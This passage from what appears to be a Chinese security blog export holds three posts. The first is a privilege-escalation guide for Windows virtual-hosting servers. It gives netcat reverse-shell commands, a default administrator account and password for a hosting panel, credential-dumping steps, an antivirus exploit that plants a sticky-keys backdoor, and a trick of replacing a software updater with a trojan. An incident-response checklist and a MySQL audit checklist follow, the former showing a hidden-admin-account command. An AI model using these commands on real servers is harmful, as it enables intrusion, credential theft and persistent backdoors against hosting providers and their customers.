<p>-e 程序重定向</p>
<p>本地cmd执行：nc -vv -l -p 52 进行反弹</p>
<p>接着在shell里执行命令：c:windowstempnc.exe -vv 服务器ip 999 -e c:windowstempcmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多</p>
<p>执行成功后本地cmd命令：cd&#x2F; （只是习惯而已）</p>
<p>接着以telnet命令连接服务器：telnet 服务器ip 999</p>
<p>回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！</p>
<p>坏蛋：<br>本地cmd执行：nc -vv -l -p 52 进行反弹<br>c:windowstempnc.exe -e c:windowstempcmd.exe 服务器ip 52</p>
<p>低调小飞：<br>shell执行命令c:windowstempnc.exe -l -p 110 -t -e c:windowstempcmd.exe</p>
<p>一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:windowstempnc.exe 命令这里输入：-vv 服务器ip 999 -e c:windowstempcmd.exe</p>
<p>这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。</p>
<h2 id="星外提权–windows"><a href="#星外提权–windows" class="headerlink" title="星外提权–windows"></a><strong>星外提权–windows</strong></h2><p>如何知道是不是星外主机？</p>
<p>第一：网站物理路径存在“freehost”<br>第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹</p>
<p>默认帐号：freehostrunat<br>默认密码：fa41328538d7be36e83ae91a78a1b16f!7</p>
<p>freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可</p>
<p>星外常写目录：</p>
<p>C:RECYCLER<br>C:windowstemp<br>e:recycler<br>f:recycler<br>C:phpPEAR<br>C:WINDOWS7i24.comFreeHost<br>C:phpdev<br>C:System Volume Information<br>C:7i24.comserverdoctorlog<br>C:WINDOWSTemp<br>c:windowshchiblis.ibl<br>C:7i24.comiissafelog<br>C:7i24.comLinkGatelog<br>C:Program FilesThunder NetworkThunder7<br>C:Program FilesThunder NetworkThunder<br>C:Program FilesSymantec AntiVirusSAVRT<br>c:windowsDriverPacksCAM2<br>C:Program FilesFlashFXP<br>c:Program FilesMicrosoft SQL Server90SharedErrorDumps<br>C:Program FilesZendZendOptimizer-3.3.0<br>C:Program FilesCommon Files<br>c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv<br>c:Program Files360360SafedeepscanSectionmutex.db<br>c:Program FilesHeliconISAPI_Rewrite3error.log<br>c:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>c:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>C:Program FilesZendZendOptimizer-3.3.0docs<br>C:Documents and SettingsAll UsersDRM<br>C:Documents and SettingsAll UsersApplication DataMcAfeeDesktopProtection<br>C:Documents and SettingsAll UsersApplication Data360safesoftmgr<br>C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>C:Documents and SettingsAll UsersApplication DataMicrosoftMedia Index</p>
<h2 id="ee提权法："><a href="#ee提权法：" class="headerlink" title="ee提权法："></a>ee提权法：</h2><p>找个可读可写目录上传ee.exe</p>
<p>cmd命令：&#x2F;c c:windowstempcookiesee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）</p>
<p>接着命令：&#x2F;c c:windowstempcookiesee.exe -u 724 （获取星外的帐号密码）</p>
<h2 id="vbs提权法："><a href="#vbs提权法：" class="headerlink" title="vbs提权法："></a>vbs提权法：</h2><p>找个可读可写目录上传cscript.exe iispwd.vbs</p>
<p>cmd命令：&#x2F;c “c:windowstempcookiescscript.exe” c:windowstempcookiesiispwd.vbs</p>
<p>意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。</p>
<p>可行思路大全：</p>
<p>经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：</p>
<p>360杀毒db文件替换:<br>c:Program Files360360SDdeepscanSectionmutex.db<br>c:Program Files360360SafedeepscanSectionmutex.db<br>C:Program Files360360SafeAntiSectionmutex.db</p>
<p>IISrewrite3 文件替换：<br>C:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>C:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>C:Program FilesHeliconISAPI_Rewrite3error.log</p>
<p>诺顿杀毒文件替换:<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedPersist.Dat</p>
<p>一流过滤相关目录及文件：<br>C:7i24.comiissafelogstartandiischeck.txt<br>C:7i24.comiissafelogscanlog.htm</p>
<p>其他:<br>Zend文件替换：C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>华盾文件替换：C:WINDOWShchiblis.ibl<br>Flash文件替换：C:WINDOWSsystem32MacromedFlashFlash10q.ocx<br>DU Meter流量统计信息日志文件替换：c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv</p>
<h2 id="360提权–windows"><a href="#360提权–windows" class="headerlink" title="360提权–windows"></a><strong>360提权–windows</strong></h2><p>找个可读可写目录上传360.exe</p>
<p>cmd命令：&#x2F;c c:windowstempcookies360.exe</p>
<p>会提示3段英文：</p>
<p>360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2</p>
<p>You will get a Shift5 door!</p>
<p>Shift5 Backdoor created! </p>
<p>这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</p>
<h2 id="搜狗提权–windows"><a href="#搜狗提权–windows" class="headerlink" title="搜狗提权–windows"></a><strong>搜狗提权–windows</strong></h2><p>搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe</p>
<p>我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</p>
<h2 id="华众虚拟主机提权–windows"><a href="#华众虚拟主机提权–windows" class="headerlink" title="华众虚拟主机提权–windows"></a><strong>华众虚拟主机提权–windows</strong></h2><p>就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。</p>
<p>所以华众提权关键之处就是搜集信息，主要注册表位置：</p>
<p>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmysqlpass root密码<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmssqlpss sa 密码</p>
<p>c:windowstemp 下有hzhost主机留下的ftp登陆记录有用户名和密码</p>
<p>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</p>
<p>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p>
<h2 id="N点虚拟主机–windows"><a href="#N点虚拟主机–windows" class="headerlink" title="N点虚拟主机–windows"></a><strong>N点虚拟主机–windows</strong></h2><p>N点虚拟主机管理系统默认数据库地址为：host_date#host # date#.mdb</p>
<p>rl直接输入不行 这里咱们替换下 #&#x3D;# 空格&#x3D;</p>
<p>修改后的下载地址为&#x2F;host_date&#x2F;#host # date#196.mdb</p>
<p>N点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码</p>
<p>N点默认安装路径C:Program FilesNpointSoftnpointhostweb<br>D:Program FilesNpointSoftnpointhostweb<br>默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>内网渗透</tag>
        <tag>Linux</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应分析排查学习</title>
    <url>/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%86%E6%9E%90%E6%8E%92%E6%9F%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0200713/</url>
    <content><![CDATA[<h1 id="应急响应分析排查简单学习200713"><a href="#应急响应分析排查简单学习200713" class="headerlink" title="应急响应分析排查简单学习200713"></a>应急响应分析排查简单学习200713</h1><h2 id="Windows分析排查"><a href="#Windows分析排查" class="headerlink" title="Windows分析排查"></a>Windows分析排查</h2><h3 id="文件分析——开机启动文件"><a href="#文件分析——开机启动文件" class="headerlink" title="文件分析——开机启动文件"></a>文件分析——开机启动文件</h3><p>一般情况下恶意文件都会在开机自启，</p>
<ol>
<li><p>利用操作系统中的启动菜单<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu(开始菜单)\Programs\Startup</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056761.png" alt="image-202207120931460321"></p>
</li>
<li><p>利用系统配置 msconfig</p>
<img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056327.png" alt="image-20220712093526206" style="zoom: 67%;" />

<img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056112.png" alt="image-20220712093507951" style="zoom:50%;" />
</li>
<li><p>利用注册表 regedit<br>HKEY_ CURRENT USERS&#x2F; software&#x2F; Microsoft&#x2F;Windows&#x2F; CurrentVersion&#x2F; Run</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056571.png" alt="image-20220712094333354"></p>
</li>
</ol>
<h3 id="文件分析——temp临时异常文件"><a href="#文件分析——temp临时异常文件" class="headerlink" title="文件分析——temp临时异常文件"></a>文件分析——temp临时异常文件</h3><p>temp (临时文件夹) ,位于C:\Documents and Settings\Administrator\I ocal Settings\内。很多临时文件放在这里，用来收藏夹、浏览网页的临时文件、编辑文件等。</p>
<p>使用运行输入%temp%可以直接打开temp文件夹</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056269.png" alt="image-20220712095517369"></p>
<p>查看temp文件夹发现PE文件(exe、 dll、sys) ,或者是否具有特别大的tmp文件。</p>
<h3 id="文件分析——浏览器信息分析"><a href="#文件分析——浏览器信息分析" class="headerlink" title="文件分析——浏览器信息分析"></a>文件分析——浏览器信息分析</h3><p>在被黑客拿下的服务器，很有可能会使用浏览器进行网站的访问。因此我们可以查看浏览器记录查看，探索浏览器是否被使用下载恶意代码。</p>
<p>利用这个软件可以进行历史记录查找。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056287.png" alt="image-20220712101526364"></p>
<h3 id="文件分析——文件时间属性"><a href="#文件分析——文件时间属性" class="headerlink" title="文件分析——文件时间属性"></a>文件分析——文件时间属性</h3><p>在Windows系统下，文件属性的时间属性具有:创建时间、修改时间、访问时间(默认情况下禁用)<br>默认情况下，计算机是以修改时间作为展示。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056827.png" alt="image-20220712103624935"></p>
<h3 id="文件分析——最近打开文件分析"><a href="#文件分析——最近打开文件分析" class="headerlink" title="文件分析——最近打开文件分析"></a>文件分析——最近打开文件分析</h3><p>Windows系统中默认记录系统中最近打开使用的文件信息。<br>可以在目录C:\Documents and Settings\Administrator\Recent下查看，也可以使用win+R打开运行,输入%UserProfile%\Recent查看。然后利用Windows中的筛选条件查看具体时间范围的文件。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056119.png" alt="image-20220712104258066"></p>
<h3 id="进程分析——可疑进程发现与关闭"><a href="#进程分析——可疑进程发现与关闭" class="headerlink" title="进程分析——可疑进程发现与关闭"></a>进程分析——可疑进程发现与关闭</h3><p>计算机与外部网络通信是建立在TCP或UDP协议上的，并且每一次通信都是具有不同的端口(0~65535) 。如果计算机被木马后， 肯定会与外部网络通信，那么此时就可以通过查看网络连接状态，找到对应的进程ID,然后关闭进程ID就可以关闭连接状态。</p>
<ol>
<li><p><code>netstat -ano | find“ESTABLISHED”</code>查看网络建立连接状态</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056072.png" alt="image-20220712145342499"></p>
</li>
<li><p><code>tasklist /svc | find“PID”</code>查看具体PID进程对应的程序</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056637.png" alt="image-20220712145815078"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056905.png" alt="image-20220712145805650"></p>
</li>
<li><p><code>taskill /PID pid值/T</code>关闭进程</p>
</li>
</ol>
<h3 id="系统信息——Windows计划任务"><a href="#系统信息——Windows计划任务" class="headerlink" title="系统信息——Windows计划任务"></a>系统信息——Windows计划任务</h3><p>在计算机中可以通过设定计划任务,在固定时间执行固定操作。一般情况下，恶意代码也有可能在固定的时间设置执行。<br>使用at命令可以对计划任务进行管理，直接输入at可以查看 当前计算机中保存的计划任务。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056094.png" alt="image-20220712150506360"></p>
<p>还可以打开任务计划程序</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056811.png" alt="image-20220712150621557"></p>
<h3 id="系统信息——隐藏账户的发现和删除"><a href="#系统信息——隐藏账户的发现和删除" class="headerlink" title="系统信息——隐藏账户的发现和删除"></a>系统信息——隐藏账户的发现和删除</h3><p>隐藏账号，是指”黑客” 入侵之后为了能够持久保持对计算机访问，而在计算机系统中建立的不轻易被发现的计算机账户。</p>
<p>最为简单的隐藏账户建立: <code>net user test$ test /add &amp;&amp; net localgroup administrator test$ /add</code></p>
<p>其中<code>$</code>符号可以导致系统管理员在使用<code>net user</code>时无法查看到<code>test$</code>用户。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131056850.png" alt="image-20220712152719872"></p>
<p>但是我们可以在计算机管理的本地用户和组里面发现他</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131055959.png" alt="image-20220712152906689"></p>
<h3 id="恶意进程——发现与关闭"><a href="#恶意进程——发现与关闭" class="headerlink" title="恶意进程——发现与关闭"></a>恶意进程——发现与关闭</h3><p>恶意代码在Windows系统中运行过程中，将以进程的方式进行展示。其中恶意进程执行着各种恶意行为。<br>对于可执行程序，可以直接使用杀毒软件进行查杀，但是并非所有的恶意程序能够被查杀。此时可以手动查杀，使用工具psexplore ,然后利用virustotal.com 进行分析。对恶意程序相关的服务进行关闭。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/image-20220713100006640.png" alt="image-20220713100006640"></p>
<h3 id="系统信息——补丁的查看和更新"><a href="#系统信息——补丁的查看和更新" class="headerlink" title="系统信息——补丁的查看和更新"></a>系统信息——补丁的查看和更新</h3><p>Windows系统支持补丁以修补漏洞。可以使用<code>systeminfo</code>查看系统信息，并展示对应的系统补J信息编号。<br>也可以在卸载软件中查看系统补丁和第三方软件补丁。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131102436.png" alt="image-20220713110221376"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131102638.png" alt="image-20220713110241580"></p>
<p>在Win10中使用快捷键<code>win+I</code>然后选择windows更新。其他版本的Windows也具有 Windows Update相关选项，<br>可以进行更新操作。</p>
<h2 id="Linux分析排查"><a href="#Linux分析排查" class="headerlink" title="Linux分析排查"></a>Linux分析排查</h2><h3 id="文件分析——tmp临时目录文件"><a href="#文件分析——tmp临时目录文件" class="headerlink" title="文件分析——tmp临时目录文件"></a>文件分析——tmp临时目录文件</h3><p>在Linux系统下一切都是文件。其中&#x2F;tmp是一个特别的 临时目录文件。每个用户都可以对它进行读写操作。<br>因此一个普通用户可以对&#x2F;tmp目录执行读写操作。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131120907.png" alt="image-20220713112053829"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131123606.png" alt="image-20220713112327534"></p>
<h3 id="文件分析——开机启动文件-1"><a href="#文件分析——开机启动文件-1" class="headerlink" title="文件分析——开机启动文件"></a>文件分析——开机启动文件</h3><p>查看开机启动项内容&#x2F;etc&#x2F;init.d&#x2F; ，恶意代码很有可能设置在开机自启动的位置。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131128855.png" alt="image-20220713112857805"></p>
<p>查看文件时间属性 <code>stat 文件名</code></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131133589.png" alt="image-20220713113331555"></p>
<p>查看24小时以内被修改的文件</p>
<p><code>find ./ -mtime 0 -name &quot;*.php&quot;</code></p>
<p>查看72小时内新增的文件</p>
<p><code>find ./ -ctime -2 -name &quot;*.php&quot;</code></p>
<p>权限查找:在linux系统中，如果具有777权限，那么文件很可疑。<br><code>find .7 -iname“* .php” -perm 777</code>其中<code>-iname</code>忽略大小写，<code>-perm</code> 用于设定筛选文件权限</p>
<h3 id="进程分析——网络连接分析"><a href="#进程分析——网络连接分析" class="headerlink" title="进程分析——网络连接分析"></a>进程分析——网络连接分析</h3><p>在linux中可以使用netstat进行网络连接查看。<br><code>netstat - Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships</code><br>具体帮助信息查看<code>man netstat</code><br>常用命令<br><code>netstat -pantl</code> 查看处于<code>tcp</code>网络套接字相关信息。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131453314.png" alt="image-20220713145342257"></p>
<p><code>netstat -9 pid</code>关闭连接</p>
<h3 id="进程分析——进程所对应的文件"><a href="#进程分析——进程所对应的文件" class="headerlink" title="进程分析——进程所对应的文件"></a>进程分析——进程所对应的文件</h3><p>使用<code>ps aux</code>查看所有进程信息</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131502818.png" alt="image-20220713150212747"></p>
<p>使用<code>ps aux | grep PID</code>筛选出具体的<code>PID</code>的进程信息，<code>lsof -i :端口号</code>也可以实现类似的功能</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131505766.png" alt="image-20220713150505730"></p>
<h3 id="日志分析——登录操作分析"><a href="#日志分析——登录操作分析" class="headerlink" title="日志分析——登录操作分析"></a>日志分析——登录操作分析</h3><p>在Linux做的操作都会被记录到系统日志中，对于登录也可以查看日志信息查看是否有异常登录。<br>last命令<code>last-i | grep -v 0.0.0.0</code>查看登录日志,筛选非本地登录。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131509013.png" alt="image-20220713150958983"></p>
<p>不筛除本地↓</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131512360.png" alt="image-20220713151200325"></p>
<p><code>W</code>命令 实时查看当前登录用户</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207131510020.png" alt="image-20220713151043990"></p>
<h3 id="日志分析——异常用户分析排查"><a href="#日志分析——异常用户分析排查" class="headerlink" title="日志分析——异常用户分析排查"></a>日志分析——异常用户分析排查</h3><p>root 用户在Linux中拥有最高的权限，他的<code>uid</code>和<code>gid</code>都为0。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141540084.png" alt="image-20220714154013033"></p>
<p>而我们可以利用<code>useradd username</code>来添加用户</p>
<p>​				   利用<code>password username</code>来添加密码</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141542786.png" alt="image-20220714154230759"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141542576.png" alt="image-20220714154242551"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141542456.png" alt="image-20220714154255429"></p>
<p>而我们可以利用<code>vim</code>命令来修改<code>/etc/passwd</code>的用户<code>uid和gid</code>的值为0，从而拿到<code>ROOT</code>权限。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141546123.png" alt="image-20220714154616091"></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141546052.png" alt="image-20220714154602010"></p>
<h3 id="日志分析——历史命令查询"><a href="#日志分析——历史命令查询" class="headerlink" title="日志分析——历史命令查询"></a>日志分析——历史命令查询</h3><p>在Linux系统中默认会记录之前执行的命令<code>/root/ .bash history</code>文件中。<br>用户可以使用<code>cat /root/ .bash history </code>进行查看或着使用<code>history </code>命令进行查看</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141550709.png" alt="image-20220714155035647"></p>
<p>特别注意:<code>wget</code> (可能远程下载木马)、<code>ssh </code>(连接内网主机)、<code>tar zip</code>类命令(数据打包)、系统配置等(命令修改)</p>
<h3 id="计划任务排查"><a href="#计划任务排查" class="headerlink" title="计划任务排查"></a>计划任务排查</h3><p>在Linux系统中可以使用命令<code>crontab</code>进行计划任务的设定</p>
<p>编辑设定的计划任务<code>crontab -e</code></p>
<p>查看设定的计划任务<code>crontab -l</code></p>
<p>删除设定的计划任务任务<code>crontab -r</code></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141559532.png" alt="image-20220714155917500"></p>
<h3 id="开机启动项排查"><a href="#开机启动项排查" class="headerlink" title="开机启动项排查"></a>开机启动项排查</h3><p>在Iinux(Debian)系统中<code>/etc/init.d/</code> 目录下保存着开机自启动程序的目录。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141603046.png" alt="image-20220714160335001"></p>
<p>用户可以直接使用<code>/etc/init.d/ 程序名称 status</code>查看状态。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141606378.png" alt="image-20220714160620345">使用<code>update-rc.d 程序名称 disable </code>取消开机自启动。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>内网渗透</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>等级保护-Mysql</title>
    <url>/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-Mysql/</url>
    <content><![CDATA[<h1 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h1><h2 id="应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"><a href="#应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换" class="headerlink" title="应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换"></a>应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换</h2><h3 id="使用如下命令查询账号"><a href="#使用如下命令查询账号" class="headerlink" title="使用如下命令查询账号:"></a>使用如下命令查询账号:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>, host,password <span class="keyword">from</span> mysql.user;</span><br><span class="line">#输出用户列表，查者是否存在相同用户名 </span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618366.png" alt="image-20220714161800298"></p>
<h3 id="执行如下语句查询是否在空口令用："><a href="#执行如下语句查询是否在空口令用：" class="headerlink" title="执行如下语句查询是否在空口令用："></a>执行如下语句查询是否在空口令用：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> length(password)<span class="operator">=</span> <span class="number">0</span> <span class="keyword">or</span> password <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"># 输出结果是否为空</span><br></pre></td></tr></table></figure>
<p>MySQL身份鉴别通过username+host+password来进行登录验证，鉴别因素三者不能同时为空<br><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618638.png" alt="image-20220714161824567"></p>
<h3 id="查看用户口今复杂度相关配置"><a href="#查看用户口今复杂度相关配置" class="headerlink" title="查看用户口今复杂度相关配置:"></a>查看用户口今复杂度相关配置:</h3><p>针对5.6.6之后版本</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;validate_password%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">validate_password_check_user_name:OFF</span><br><span class="line">validate_password_dictionary_file: 字典文件</span><br><span class="line">validate_password_length:8 密码长度</span><br><span class="line">validate_password_mixed_case_count:1 大小写</span><br><span class="line">validate_password_number_count:1 密码中数据长度</span><br><span class="line">validate_password_policy:1 or MEDIUM</span><br><span class="line">validate_password_special_char_count:1 特殊字符</span><br></pre></td></tr></table></figure>
<h3 id="定期更换"><a href="#定期更换" class="headerlink" title="定期更换"></a>定期更换</h3><p>MySQL5.6.6以后在user表中有一个password_last_changed字段，该字段默认为N修改为Y后可以通过定时器任务来进行密码修改。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> password_expired <span class="keyword">from</span> mysql.user;</span><br><span class="line">#该字段默认为N</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141618346.png" alt="image-20220714161856301"></p>
<h2 id="应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"><a href="#应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施" class="headerlink" title="应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"></a>应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施</h2><h3 id="登录失败"><a href="#登录失败" class="headerlink" title="登录失败"></a>登录失败</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%max_connect_errors%&#x27;</span>;</span><br><span class="line"># max_connect_errors 是用户输入密码最大错误次数，失败达到最大次数则锁定</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141619065.png" alt="image-20220714161913016"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%timeout%&#x27;</span>;</span><br><span class="line"># 查看返回值Wait_timeout，这个参数是超时重连的时间，每过N秒MySQL就会重启</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141619238.png" alt="image-20220714161934175"></p>
<h2 id="当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"><a href="#当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听" class="headerlink" title="当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听"></a>当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</h2><p>这个通过询问看看使用的远程链接方式是什么，查询此连接工具是否具备远程连接加密措施</p>
<h2 id="应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"><a href="#应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现" class="headerlink" title="应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现"></a>应采用口令、密码技术、生物技术等两种或两种以上组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现</h2><p>询问并核查是否采用双因子登录数据库，且其中一种属于密码技术</p>
<ul>
<li>通常情况下都是用户名+口令，且数据库层面实现双因子登录比较困难</li>
</ul>
<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="应对登录的用户分配账户和权限"><a href="#应对登录的用户分配账户和权限" class="headerlink" title="应对登录的用户分配账户和权限"></a>应对登录的用户分配账户和权限</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141620971.png" alt="image-20220714162005928"></p>
<p>询问数据库管理员各个账户的作用与权限，输出结果是否与实际人员相符</p>
<h2 id="应重命名或删除默认账户，修改默认账户的默认口令"><a href="#应重命名或删除默认账户，修改默认账户的默认口令" class="headerlink" title="应重命名或删除默认账户，修改默认账户的默认口令"></a>应重命名或删除默认账户，修改默认账户的默认口令</h2><p>查看默认用户是否重命名以及修改默认口令</p>
<h2 id="应及时删除或停用多余的、过期的账户，避免共享账户的存在；"><a href="#应及时删除或停用多余的、过期的账户，避免共享账户的存在；" class="headerlink" title="应及时删除或停用多余的、过期的账户，避免共享账户的存在；"></a>应及时删除或停用多余的、过期的账户，避免共享账户的存在；</h2><p>查看user表再访谈管理员表中用户与现实是否做到一一对应，且无共用，多余，过期的账户</p>
<h2 id="应授予管理用户所需的最小权限，实现管理用户的权限分离"><a href="#应授予管理用户所需的最小权限，实现管理用户的权限分离" class="headerlink" title="应授予管理用户所需的最小权限，实现管理用户的权限分离"></a>应授予管理用户所需的最小权限，实现管理用户的权限分离</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> Host,<span class="keyword">User</span>,File_priv,Shutdown_priv，grant_priv <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line">#</span><br><span class="line"> file_priv  加载服务器主机上的文件</span><br><span class="line"> grant_priv  数据库、表、存储过程或函数</span><br><span class="line"> shutdown_priv  关闭服务器</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
